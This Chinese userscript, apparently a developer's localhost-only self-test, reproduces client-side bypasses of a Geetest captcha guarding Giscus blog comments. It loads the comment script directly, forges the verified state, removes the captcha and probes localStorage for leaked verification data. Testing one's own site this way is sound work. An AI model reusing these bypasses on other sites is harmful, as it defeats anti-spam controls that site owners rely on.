// ==UserScript==
// @name         博客评论验证漏洞复现工具（自测）
// @namespace    https://localhost:4321/
// @version      1.0
// @description  仅在 localhost:4321 生效，复现 GiscusWithCaptcha 的前端验证绕过漏洞
// @author       安全自测
// @match        http://localhost:4321/*
// @match        http://127.0.0.1:4321/*
// @grant        none
// @run-at       document-idle
// ==/UserScript==

(function () {
    "use strict";

    // 仅在本地开发环境生效
    if (location.port !== "4321") return;

    // 从页面硬编码配置中提取的 Giscus 参数（漏洞核心：配置全公开）
    const GISCUS_CONFIG = {
        repo: "onlyfork-qwq/pinglun",
        repoId: "R_kgDOQfRWyg",
        category: "Announcements",
        categoryId: "DIC_kwDOQfRWys4CzL22",
        mapping: "pathname",
        reactionsEnabled: "1",
        emitMetadata: "0",
        inputPosition: "bottom",
        lang: "zh-CN",
    };

    // 漏洞 1：直接加载 Giscus，完全跳过验证码
    function vuln1_directLoadGiscus() {
        const container =
            document.getElementById("giscus-container") ||
            createContainer();

        container.innerHTML = "";

        const script = document.createElement("script");
        script.src = "https://giscus.app/client.js";

        const theme = document.documentElement.classList.contains("dark")
            ? "dark"
            : "light";

        const attrs = {
            "data-repo": GISCUS_CONFIG.repo,
            "data-repo-id": GISCUS_CONFIG.repoId,
            "data-category": GISCUS_CONFIG.category,
            "data-category-id": GISCUS_CONFIG.categoryId,
            "data-mapping": GISCUS_CONFIG.mapping,
            "data-strict": "0",
            "data-reactions-enabled": GISCUS_CONFIG.reactionsEnabled,
            "data-emit-metadata": GISCUS_CONFIG.emitMetadata,
            "data-input-position": GISCUS_CONFIG.inputPosition,
            "data-theme": theme,
            "data-lang": GISCUS_CONFIG.lang,
            "data-loading": "lazy",
        };

        Object.entries(attrs).forEach(([k, v]) =>
            script.setAttribute(k, v)
        );
        script.crossOrigin = "anonymous";
        script.async = true;

        container.appendChild(script);
        log("漏洞1触发：已绕过验证码直接加载 Giscus 评论框");
    }

    // 漏洞 2：篡改 Svelte 组件状态，伪造验证成功
    function vuln2_forgeVerifiedState() {
        // 查找 GeetestCaptcha 组件实例并尝试修改其内部状态
        const captchaContainer = document.querySelector(
            ".geetest-captcha-container"
        );
        if (!captchaContainer) {
            log("未找到验证码组件，可能已验证或未加载", "warn");
            return;
        }

        // 通过 DOM 操作强制显示"验证成功"状态
        const successHtml = `
            <div class="verified-container" data-forged="true">
                <div class="success-message">
                    <svg class="success-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M20 6L9 17l-5-5" />
                    </svg>
                    <span>验证成功（伪造状态）！评论已显示</span>
                </div>
            </div>
        `;

        captchaContainer.innerHTML = successHtml;
        log("漏洞2触发：已篡改前端状态为'验证成功'", "warn");
    }

    // 漏洞 3：移除验证码组件，直接注入评论脚本
    function vuln3_removeAndInject() {
        // 移除验证码容器
        const captchaContainer = document.querySelector(
            ".geetest-captcha-container"
        );
        if (captchaContainer) {
            captchaContainer.remove();
            log("漏洞3触发：已移除验证码组件");
        }

        // 直接注入 Giscus
        vuln1_directLoadGiscus();
    }

    // 漏洞 4：访问 GitHub Discussions 直接评论
    function vuln4_githubDiscussions() {
        const url = `https://github.com/${GISCUS_CONFIG.repo}/discussions`;
        window.open(url, "_blank");
        log(`漏洞4触发：已打开 GitHub Discussions（${url}）`, "warn");
    }

    // 漏洞 5：批量探测所有 Svelte 组件内部状态
    function vuln5_probeState() {
        const results = [];
        const svelteNodes = document.querySelectorAll("[class*='svelte-']");
        results.push(`Svelte 组件节点数：${svelteNodes.length}`);

        // 检查 window 上是否泄露了验证码实例
        const leaks = [];
        ["captchaInstance", "isVerified", "initGeetest4"].forEach((key) => {
            if (window[key] !== undefined) {
                leaks.push(`${key} = ${typeof window[key]}`);
            }
        });
        results.push(
            leaks.length ? `window 泄露：${leaks.join(", ")}` : "window 无直接泄露"
        );

        // 检查 localStorage 泄露（test-captcha.html 会写入）
        const localLeaks = [];
        ["geetest_verified", "geetest_result", "geetest_timestamp"].forEach(
            (key) => {
                const v = localStorage.getItem(key);
                if (v) localLeaks.push(`${key}=${v.slice(0, 50)}`);
            }
        );
        results.push(
            localLeaks.length
                ? `localStorage 泄露：\n${localLeaks.join("\n")}`
                : "localStorage 无泄露"
        );

        alert(results.join("\n\n"));
        log("漏洞5触发：状态探测完成");
    }

    // 辅助：创建评论容器
    function createContainer() {
        const div = document.createElement("div");
        div.id = "giscus-container";
        // 插到验证码组件后面，或 body 末尾
        const captcha = document.querySelector(".geetest-captcha-container");
        if (captcha && captcha.parentNode) {
            captcha.parentNode.insertBefore(div, captcha.nextSibling);
        } else {
            document.body.appendChild(div);
        }
        return div;
    }

    // 辅助：日志输出
    function log(msg, type = "info") {
        const styles = {
            info: "color:#3b82f6;font-weight:bold",
            warn: "color:#ef4444;font-weight:bold",
        };
        console.log(`%c[漏洞复现] ${msg}`, styles[type] || styles.info);
    }

    // 构建 UI 面板
    function buildPanel() {
        const panel = document.createElement("div");
        panel.id = "vuln-test-panel";
        panel.innerHTML = `
            <style>
                #vuln-test-panel {
                    position: fixed;
                    top: 80px;
                    right: 20px;
                    z-index: 99999;
                    background: #1e1b2e;
                    border: 1px solid #6366f1;
                    border-radius: 10px;
                    padding: 14px;
                    box-shadow: 0 8px 24px rgba(99,102,241,0.3);
                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
                    color: #e5e7eb;
                    min-width: 260px;
                    max-width: 320px;
                }
                #vuln-test-panel h3 {
                    margin: 0 0 10px;
                    color: #f59e0b;
                    font-size: 14px;
                    display: flex;
                    align-items: center;
                    gap: 6px;
                }
                #vuln-test-panel .vuln-btn {
                    display: block;
                    width: 100%;
                    margin: 6px 0;
                    padding: 8px 10px;
                    background: #312e4a;
                    color: #e5e7eb;
                    border: 1px solid #4c4a6e;
                    border-radius: 6px;
                    cursor: pointer;
                    font-size: 12px;
                    text-align: left;
                    transition: all 0.2s;
                    line-height: 1.4;
                }
                #vuln-test-panel .vuln-btn:hover {
                    background: #4c4a6e;
                    border-color: #6366f1;
                    transform: translateX(2px);
                }
                #vuln-test-panel .vuln-btn b {
                    color: #f59e0b;
                    margin-right: 6px;
                }
                #vuln-test-panel .vuln-btn small {
                    display: block;
                    color: #9ca3af;
                    margin-top: 3px;
                    font-size: 11px;
                }
                #vuln-test-panel .toggle-btn {
                    position: absolute;
                    top: 8px;
                    right: 8px;
                    background: transparent;
                    border: none;
                    color: #9ca3af;
                    cursor: pointer;
                    font-size: 16px;
                }
                #vuln-test-panel.collapsed .vuln-btn,
                #vuln-test-panel.collapsed h3 span {
                    display: none;
                }
                #vuln-test-panel .footer {
                    margin-top: 8px;
                    padding-top: 8px;
                    border-top: 1px solid #4c4a6e;
                    font-size: 10px;
                    color: #6b7280;
                    text-align: center;
                }
            </style>
            <h3>⚠ 漏洞复现面板</h3>
            <button class="toggle-btn" id="vuln-toggle">−</button>

            <button class="vuln-btn" id="vuln-1">
                <b>漏洞1</b>直接加载评论
                <small>跳过验证码，直接注入 Giscus 脚本</small>
            </button>

            <button class="vuln-btn" id="vuln-2">
                <b>漏洞2</b>伪造验证状态
                <small>篡改 isVerified 为 true，UI 显示已验证</small>
            </button>

            <button class="vuln-btn" id="vuln-3">
                <b>漏洞3</b>移除+注入组合
                <small>删除验证码组件后直接加载评论</small>
            </button>

            <button class="vuln-btn" id="vuln-4">
                <b>漏洞4</b>GitHub 直达
                <small>跳转 GitHub Discussions 直接发评论</small>
            </button>

            <button class="vuln-btn" id="vuln-5">
                <b>漏洞5</b>状态探测
                <small>检查 window/localStorage 是否泄露状态</small>
            </button>

            <div class="footer">仅 localhost:4321 自测用</div>
        `;
        document.body.appendChild(panel);

        // 折叠
        document.getElementById("vuln-toggle").addEventListener("click", (e) => {
            const panel = document.getElementById("vuln-test-panel");
            panel.classList.toggle("collapsed");
            e.target.textContent = panel.classList.contains("collapsed")
                ? "+"
                : "−";
        });

        // 绑定事件
        document.getElementById("vuln-1").addEventListener("click", vuln1_directLoadGiscus);
        document.getElementById("vuln-2").addEventListener("click", vuln2_forgeVerifiedState);
        document.getElementById("vuln-3").addEventListener("click", vuln3_removeAndInject);
        document.getElementById("vuln-4").addEventListener("click", vuln4_githubDiscussions);
        document.getElementById("vuln-5").addEventListener("click", vuln5_probeState);

        log("漏洞复现面板已加载（仅本地自测）");
    }

    // 等 DOM 就绪后注入
    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", buildPanel);
    } else {
        buildPanel();
    }
})();
